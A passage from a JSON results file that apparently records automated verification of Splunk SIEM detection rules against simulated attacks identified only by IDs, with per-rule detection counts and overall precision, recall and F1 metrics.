    {
      "rule_id": "rule_7",
      "attack_id": "9f31c5a2-474c-47ab-bb97-845e8f25b3f2",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 365.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_8",
      "attack_id": "b1c49510-a2f3-40a5-b9b3-7565c3b9d756",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 258.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "rule_9",
      "attack_id": "c57fec32-ea2d-4607-b4f4-6ef4e7af0177",
      "detected": true,
      "events_found": 57,
      "historical_events": 0,
      "query_time_ms": 356.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_10",
      "attack_id": "3ccf1905-af3b-4295-a337-59586394e936",
      "detected": true,
      "events_found": 46,
      "historical_events": 0,
      "query_time_ms": 314.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_11",
      "attack_id": "d833a3eb-96fd-45b3-8da4-735d256ff4e3",
      "detected": true,
      "events_found": 42,
      "historical_events": 0,
      "query_time_ms": 576.0000000000001,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_12",
      "attack_id": "443f765f-e620-4322-a6c2-0a523d02fa55",
      "detected": true,
      "events_found": 44,
      "historical_events": 0,
      "query_time_ms": 527.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_13",
      "attack_id": "75659ecf-4e23-4485-b9f7-291e6e45dc10",
      "detected": true,
      "events_found": 46,
      "historical_events": 0,
      "query_time_ms": 373.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_14",
      "attack_id": "81346fb5-8bab-48eb-9af8-dfa19a9fe2a0",
      "detected": true,
      "events_found": 52,
      "historical_events": 0,
      "query_time_ms": 533.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_15",
      "attack_id": "e5b972c3-6987-41c2-bd51-1c18f75ee8a6",
      "detected": true,
      "events_found": 53,
      "historical_events": 0,
      "query_time_ms": 350.00000000000006,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_16",
      "attack_id": "d7b195b6-b607-4813-8433-60a207a3e0c0",
      "detected": true,
      "events_found": 52,
      "historical_events": 0,
      "query_time_ms": 519.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_17",
      "attack_id": "5cb5c229-94b1-4f1e-8252-cbd14106e9b8",
      "detected": true,
      "events_found": 54,
      "historical_events": 0,
      "query_time_ms": 388.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_18",
      "attack_id": "64fa6868-b208-4d8e-ab0c-1633b69eeabe",
      "detected": true,
      "events_found": 59,
      "historical_events": 0,
      "query_time_ms": 367.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_19",
      "attack_id": "32c6b150-9e15-45d4-b10d-323fa2aaecff",
      "detected": true,
      "events_found": 58,
      "historical_events": 0,
      "query_time_ms": 388.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_20",
      "attack_id": "23cc451f-b73f-4ecb-b7f7-6421b751b597",
      "detected": true,
      "events_found": 60,
      "historical_events": 0,
      "query_time_ms": 277.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_21",
      "attack_id": "1696e190-b8c1-4f68-a573-6da2d6b3081a",
      "detected": true,
      "events_found": 71,
      "historical_events": 0,
      "query_time_ms": 435.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_22",
      "attack_id": "3a65cdbb-43e9-44f3-90ad-7ad6a550ab9e",
      "detected": true,
      "events_found": 66,
      "historical_events": 0,
      "query_time_ms": 578.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_23",
      "attack_id": "8bf125bb-8e41-46fd-b6ed-a4a69a091557",
      "detected": true,
      "events_found": 62,
      "historical_events": 0,
      "query_time_ms": 631.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_24",
      "attack_id": "4bbac6cf-4b3c-4e28-a837-3b50b484a5b9",
      "detected": true,
      "events_found": 64,
      "historical_events": 0,
      "query_time_ms": 1092.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_25",
      "attack_id": "46903b3c-465d-4d27-929c-900b0b81f9f3",
      "detected": true,
      "events_found": 63,
      "historical_events": 0,
      "query_time_ms": 353.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "rule_26",
      "attack_id": "e58a3715-6095-413c-928f-dbbe8dabef2b",
      "detected": true,
      "events_found": 84,
      "historical_events": 0,
      "query_time_ms": 394.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    }
  ],
  "siem_metrics": {
    "true_positives": 18,
    "false_positives": 0,
    "false_negatives": 9,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.6666666666666666,
    "f1_score": 0.8,
    "accuracy": 0.6666666666666666,
    "detection_rate": 0.6666666666666666,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.694,
  "timestamp": "2025-12-20T22:57:41.533969"
}